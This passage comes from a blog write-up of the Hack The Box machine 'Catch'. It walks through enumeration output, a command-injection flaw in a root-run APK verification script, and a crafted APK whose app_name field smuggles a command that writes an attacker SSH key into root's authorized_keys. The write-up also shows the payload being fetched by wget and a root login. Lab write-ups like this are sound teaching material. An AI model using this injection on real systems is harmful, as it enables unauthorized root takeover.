+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre>╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                       
+tcp        0      0 172.17.0.1:6000         0.0.0.0:*               LISTEN      -                                   
+tcp        0      0 172.17.0.1:6001         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6002         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6003         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6004         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6005         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6006         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6007         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:34103         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6008         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6009         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6010         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6011         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6012         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6013         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6014         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.17.0.1:6015         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::3000                 :::*                    LISTEN      - 
+</pre></table></code></div></div><p>There seemed to be a lot of docker containers running. I figured that each of the services I had found was running out of each of those.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>╔══════════╣ Analyzing Env Files (limit 70)
+-rw-r--r-- 1 root root 708 Mar  3 02:29 /var/www/html/Cachet/.env                                                   
+APP_ENV=production
+APP_DEBUG=false
+APP_URL=http://localhost
+APP_TIMEZONE=UTC
+APP_KEY=base64:MqgBcB14yRq3I4jKQM8nGtrx74z5/GrjJsgEwbIjHik=
+DEBUGBAR_ENABLED=false
+DB_DRIVER=mysql
+DB_HOST=localhost
+DB_UNIX_SOCKET=null
+DB_DATABASE=cachet
+DB_USERNAME=homestead
+DB_PASSWORD=secret
+
+...output truncated...
+</pre></table></code></div></div><p>The Cachet <code class="language-plaintext highlighter-rouge">.env</code> file that took so long to get info out of seemed to have a different password in it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                             
+# file: /opt/mdm                                                                                                    
+USER   root      rwx     
+user   will      r-x     
+GROUP  root      r-x     
+mask             r-x     
+other            --x     
+
+# file: /opt/mdm/apk_bin
+USER   root      rwx     
+user   will      rwx     
+GROUP  root      r-x     
+mask             rwx     
+other            --x     
+
+# file: /opt/mdm/verify.sh
+USER   root      rwx     
+user   will      r-x     
+GROUP  root      r-x     
+mask             r-x     
+other            --x 
+</pre></table></code></div></div><p>The folder <code class="language-plaintext highlighter-rouge">/opt/mdm/</code> seemed to be asking to be (ab)used. Owned by root, but <code class="language-plaintext highlighter-rouge">will</code> could interact with it? I could even write in the <code class="language-plaintext highlighter-rouge">apk_bin</code> folder!</p><h2 id="optmdmverifysh">/opt/mdm/verify.sh</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>will@catch:/opt/mdm$ ls -la
+total 16
+drwxr-x--x+ 3 root root 4096 Mar  3 14:23 .
+drwxr-xr-x  4 root root 4096 Dec 16  2021 ..
+drwxrwx--x+ 2 root root 4096 Dec 16  2021 apk_bin
+-rwxr-x--x+ 1 root root 1894 Mar  3 14:23 verify.sh
+</pre></table></code></div></div><p>I checked the contents of this folder and found the <code class="language-plaintext highlighter-rouge">verify.sh</code> script I had seem running.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre><span class="c">###################</span>
+<span class="c"># MDM CheckerV1.0 #</span>
+<span class="c">###################</span>
+
+<span class="nv">DROPBOX</span><span class="o">=</span>/opt/mdm/apk_bin
+<span class="nv">IN_FOLDER</span><span class="o">=</span>/root/mdm/apk_bin
+<span class="nv">OUT_FOLDER</span><span class="o">=</span>/root/mdm/certified_apps
+<span class="nv">PROCESS_BIN</span><span class="o">=</span>/root/mdm/process_bin
+
+<span class="k">for </span>IN_APK_NAME <span class="k">in</span> <span class="nv">$DROPBOX</span>/<span class="k">*</span>.apk<span class="p">;</span><span class="k">do
+        </span><span class="nv">OUT_APK_NAME</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">IN_APK_NAME</span><span class="p">##*/</span><span class="k">}</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'.'</span> <span class="nt">-f1</span><span class="si">)</span><span class="s2">_verified.apk"</span>
+        <span class="nv">APK_NAME</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span>openssl rand <span class="nt">-hex</span> 12<span class="si">)</span><span class="s2">.apk"</span>
+        <span class="k">if</span> <span class="o">[[</span> <span class="nt">-L</span> <span class="s2">"</span><span class="nv">$IN_APK_NAME</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+                </span><span class="nb">exit
+        </span><span class="k">else
+                </span><span class="nb">mv</span> <span class="s2">"</span><span class="nv">$IN_APK_NAME</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$IN_FOLDER</span><span class="s2">/</span><span class="nv">$APK_NAME</span><span class="s2">"</span>
+        <span class="k">fi
+        </span>sig_check <span class="nv">$IN_FOLDER</span> <span class="nv">$APK_NAME</span>
+        comp_check <span class="nv">$IN_FOLDER</span> <span class="nv">$APK_NAME</span> <span class="nv">$PROCESS_BIN</span>
+        app_check <span class="nv">$PROCESS_BIN</span> <span class="nv">$OUT_FOLDER</span> <span class="nv">$IN_FOLDER</span> <span class="nv">$OUT_APK_NAME</span>
+<span class="k">done
+</span>cleanup
+</pre></table></code></div></div><p>The script <code class="language-plaintext highlighter-rouge">verify.sh</code> looked like it would take any file ending in <code class="language-plaintext highlighter-rouge">.apk</code> that was dropped into the folder <code class="language-plaintext highlighter-rouge">/opt/mdm/apk_bin</code>, do some checks on it, and then if they passed move the apk to the other folders for processing. The other folders were in the <code class="language-plaintext highlighter-rouge">/root/mdm/</code> directory, so hopefully they would be able to get code execution by root if I could get the checks to pass.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>app_check<span class="o">()</span> <span class="o">{</span>
+	<span class="nv">APP_NAME</span><span class="o">=</span><span class="si">$(</span><span class="nb">grep</span> <span class="nt">-oPm1</span> <span class="s2">"(?&lt;=&lt;string name=</span><span class="se">\"</span><span class="s2">app_name</span><span class="se">\"</span><span class="s2">&gt;)[^&lt;]+"</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">/res/values/strings.xml"</span><span class="si">)</span>
+	<span class="nb">echo</span> <span class="nv">$APP_NAME</span>
+	<span class="k">if</span> <span class="o">[[</span> <span class="nv">$APP_NAME</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"Catch"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+		</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$APP_NAME</span>|xargs <span class="nt">-I</span> <span class="o">{}</span> sh <span class="nt">-c</span> <span class="s1">'mkdir {}'</span>
+		<span class="nb">mv</span> <span class="s2">"</span><span class="nv">$3</span><span class="s2">/</span><span class="nv">$APK_NAME</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$2</span><span class="s2">/</span><span class="nv">$APP_NAME</span><span class="s2">/</span><span class="nv">$4</span><span class="s2">"</span>
+	<span class="k">else
+		</span><span class="nb">echo</span> <span class="s2">"[!] App doesn't belong to Catch Global"</span>
+		cleanup
+		<span class="nb">exit
+	</span><span class="k">fi</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>The first check looked like it only validated whether the word “Catch” was in the title. It also looked like it checked this by simply using regex to select everything after <code class="language-plaintext highlighter-rouge">&lt;string name="app_name"&gt;</code> up to a closing <code class="language-plaintext highlighter-rouge">&lt;</code>. After this it <code class="language-plaintext highlighter-rouge">echo</code>‘ed everything it just selected. This variable seemed likely injectable as there was no sanitization on what was being echoed.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"app_name"</span><span class="nt">&gt;</span>CatchApp; echo *My_ed22519_key* &gt; /root/.ssh/authorized_keys<span class="err">&lt;</span>
+</pre></table></code></div></div><p>I decided to give my apk the above payload for a Name. Next, I did some research to see if I could find the smallest, simplest, yet still viable format for building an Android APK.</p><ul><li>https://ajinasokan.com/posts/smallest-app/</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>myapp
+    |--res
+    |    |--layout
+    |           |--activity_main.xml
+    |--src
+    |   |--com
+    |       |--myapp
+    |              |--MainActivity.java
+    |
+    |--AndroidManifest.xml
+</pre></table></code></div></div><p>The blog above boasted that an APK could be created that when compiled would only be <code class="language-plaintext highlighter-rouge">6 KB</code>! This looked like it would be the easiest route to go. The blog showed that with only six folders and three files a simple “Hello World” app could be created that would actually work.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.CatchApp</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">android.app.Activity</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">android.os.Bundle</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">Activity</span> <span class="o">{</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+
+    <span class="o">}</span>
+
+<span class="o">}</span>
+</pre></table></code></div></div><p>I started off by creating the directory structure for my app that I creatively named <code class="language-plaintext highlighter-rouge">CatchApp</code> (TM). Next I created the <code class="language-plaintext highlighter-rouge">src/com/CatchApp/MainActivity.java</code> file using the template on the blog.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="nt">&lt;manifest</span> <span class="na">xmlns:android=</span><span class="s">"http://schemas.android.com/apk/res/android"</span>
+    <span class="na">package=</span><span class="s">"com.CatchApp"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;application</span>
+        <span class="na">android:label=</span><span class="s">"AppNameInSettings"</span>
+        <span class="na">android:theme=</span><span class="s">"@android:style/Theme.Light.NoTitleBar"</span><span class="nt">&gt;</span>
+
+        <span class="nt">&lt;activity</span>
+            <span class="na">android:name=</span><span class="s">".MainActivity"</span>
+            <span class="na">android:label=</span><span class="s">"AppNameInLauncher"</span> <span class="nt">&gt;</span>
+
+            <span class="nt">&lt;intent-filter&gt;</span>
+                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.MAIN"</span> <span class="nt">/&gt;</span>
+                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.LAUNCHER"</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;/intent-filter&gt;</span>
+
+        <span class="nt">&lt;/activity&gt;</span>
+    <span class="nt">&lt;/application&gt;</span>
+<span class="nt">&lt;/manifest&gt;</span>
+
+</pre></table></code></div></div><p>Next up was <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code>. Again, all I had to change was the app’s name.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="nt">&lt;LinearLayout</span> <span class="na">xmlns:android=</span><span class="s">"http://schemas.android.com/apk/res/android"</span>
+    <span class="na">android:orientation=</span><span class="s">"vertical"</span> <span class="na">android:layout_width=</span><span class="s">"match_parent"</span>
+    <span class="na">android:layout_height=</span><span class="s">"match_parent"</span><span class="nt">&gt;</span>
+
+    <span class="nt">&lt;TextView</span>
+        <span class="na">android:layout_width=</span><span class="s">"match_parent"</span>
+        <span class="na">android:layout_height=</span><span class="s">"wrap_content"</span>
+        <span class="na">android:text=</span><span class="s">"Hello World"</span><span class="nt">/&gt;</span>
+
+<span class="nt">&lt;/LinearLayout&gt;</span>
+<span class="nt">&lt;resources&gt;</span>
+        <span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"app_name"</span><span class="nt">&gt;</span>CatchApp; echo \'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIYZo4RIMknmO8eV25kRvBrshVlyNyi3WSIFhT1WgcQx\' &gt; /root/.ssh/authorized_keys <span class="nt">&lt;/string&gt;</span>
+<span class="nt">&lt;/resources&gt;</span>
+</pre></table></code></div></div><p>Next, I created the file <code class="language-plaintext highlighter-rouge">res/layout/activity_main.xml</code> with my <code class="language-plaintext highlighter-rouge">app_name</code> payload.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="nt">&lt;resources&gt;</span>
+    <span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"app_name"</span><span class="nt">&gt;</span>CatchApp; echo \'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIYZo4RIMknmO8eV25kRvBrshVlyNyi3WSIFhT1WgcQx\' &gt; /root/.ssh/authorized_keys<span class="nt">&lt;/string&gt;</span>
+<span class="nt">&lt;/resources&gt;</span>
+</pre></table></code></div></div><ul><li>https://developer.android.com/guide/topics/resources/string-resource</ul><p>The Android developer documents showed string resources in a file named <code class="language-plaintext highlighter-rouge">strings.xml</code> so just in case I put my payload inside this file as well.</p><p>Next I used apktool to build my APK, but got an error message that seemed to indicate that the file <code class="language-plaintext highlighter-rouge">apktool.yml</code> was missing. I copied the file from the other APK I decompiled easler and edited out the lines that didn’t apply. After that it built with no (breaking) errors.</p><p>I copied the file to the machine and into the <code class="language-plaintext highlighter-rouge">/opt/mdm/apk_bin</code> folder, but after the script ran it didn’t let me SSH in as root. After playing with my payload a bit, I realized that the quotes needed to be escaped. I fixed the payload and rebuilt the APK.</p><h3 id="getting-a-shell-as-root">Getting a shell as root</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>will@catch:/dev/shm$ wget http://10.10.14.138:9002/CatchApp.apk
+--2022-07-18 17:47:01--  http://10.10.14.138:9002/CatchApp.apk
+Connecting to 10.10.14.138:9002... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1933 (1.9K) [application/vnd.android.package-archive]
+Saving to: ‘CatchApp.apk’
+
+CatchApp.apk                 100%[==============================================&gt;]   1.89K  --.-KB/s    in 0s      
+
+2022-07-18 17:47:02 (4.66 MB/s) - ‘CatchApp.apk’ saved [1933/1933]
+
+will@catch:/dev/shm$ cp CatchApp.apk /opt/mdm/apk_bin
+will@catch:/dev/shm$ cd /opt/mdm/apk_bin
+will@catch:/opt/mdm/apk_bin$ ls
+CatchApp.apk
+will@catch:/opt/mdm/apk_bin$ ls
+will@catch:/opt/mdm/apk_bin$
+</pre></table></code></div></div><p>I downloaded my new APK to the victim, then copied it to the <code class="language-plaintext highlighter-rouge">/opt/mdm/apk_bin</code> folder. After the script ran it removed my app from the folder, which indicated that it was time to try to log in.</p><h3 id="roottxt">Root.txt</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/catch]
+└─$ ssh root@10.10.11.150 -i catch.key
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 18 Jul 2022 05:48:13 PM UTC
+
+  System load:                      0.48
+  Usage of /:                       71.8% of 16.61GB
+  Memory usage:                     81%
+  Swap usage:                       26%
+  Processes:                        434
+  Users logged in:                  1
+  IPv4 address for br-535b7cf3a728: 172.18.0.1
+  IPv4 address for br-fe1b5695b604: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.150
+  IPv6 address for eth0:            dead:beef::250:56ff:feb9:8f7f
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Mar 12 20:46:23 2022 from 10.10.14.19
+root@catch:~# cat root.txt
+747daeb2e40324b8bfa600fe083d5514
+</pre></table></code></div></div><p>After the APK dissapeared I tried to SSH in as root using the key I had generated, and was in! I collected my well-earned root flag and cleaned up.</p><p>Thanks to <a href="https://app.hackthebox.com/users/13531"><code class="language-plaintext highlighter-rouge">MrR3boot</code></a> for creating a machine that caused me to explore a few new topics. I had never really explored either SSTI nor Android development much before so it was quite interesting and refreshing to find something like this! The SSTI vulnerability, though being a rabbit hole, was interesting to learn and kept me entertained for longer than it should have!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_26_pwned.png" alt="Proof that the machine Catch had been finished by zweilosec on hack the box" /></p><p>If you like this content and would like to see more, please consider <a href="https://www.buymeacoffee.com/zweilosec">buying me a coffee</a>!</p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/cachet/" class="post-tag no-text-decoration" >cachet</a> <a href="/tags/letschat/" class="post-tag no-text-decoration" >letschat</a> <a href="/tags/gitea/" class="post-tag no-text-decoration" >gitea</a> <a href="/tags/cve/" class="post-tag no-text-decoration" >cve</a> <a href="/tags/android/" class="post-tag no-text-decoration" >android</a> <a href="/tags/apk/" class="post-tag no-text-decoration" >apk</a> <a href="/tags/apktool/" class="post-tag no-text-decoration" >apktool</a> <a href="/tags/slack/" class="post-tag no-text-decoration" >slack</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/sqlmap/" class="post-tag no-text-decoration" >sqlmap</a> <a href="/tags/mysql/" class="post-tag no-text-decoration" >mysql</a> <a href="/tags/twig/" class="post-tag no-text-decoration" >twig</a> <a href="/tags/ssti/" class="post-tag no-text-decoration" >ssti</a> <a href="/tags/liquid/" class="post-tag no-text-decoration" >liquid</a> <a href="/tags/markdown/" class="post-tag no-text-decoration" >markdown</a> <a href="/tags/blog/" class="post-tag no-text-decoration" >blog</a> <a href="/tags/mrr3boot/" class="post-tag no-text-decoration" >mrr3boot</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Catch Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/catch/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Catch Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/catch/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Catch Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/catch/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/playertwo/"><div class="card-body"> <span class="timeago small" > Jun 26, 2020 <i class="unloaded">2020-06-26T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - PlayerTwo Writeup</h3><div class="text-muted small"><p> HTB - PlayerTwo Overview An Insane difficulty Linux machine that tested my web skills quite a bit and also had me doing as much research on new protocols and services as three or four easy or m...</p></div></div></a></div><div class="card"> <a href="/posts/admirer/"><div class="card-body"> <span class="timeago small" > Aug 6, 2020 <i class="unloaded">2020-08-06T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Admirer Writeup</h3><div class="text-muted small"><p> HTB - Admirer Overview An easy difficulty Linux machine that has an interesting take on database manipulation to obtain a local file inclusion vulnerability. It also has an interesting new (to...</p></div></div></a></div><div class="card"> <a href="/posts/feline/"><div class="card-body"> <span class="timeago small" > Dec 13, 2020 <i class="unloaded">2020-12-13T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Feline Writeup</h3><div class="text-muted small"><p> HTB - Feline Overview Short description to include any strange things to be dealt with - Hard Linux Useful Skills and Tools Useful thing 1 description with generic example Useful thing ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/attended/" class="btn btn-outline-primary" prompt="Older"><p>Hack The Box - Attended Writeup</p></a> <a href="/posts/acute/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - Acute Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 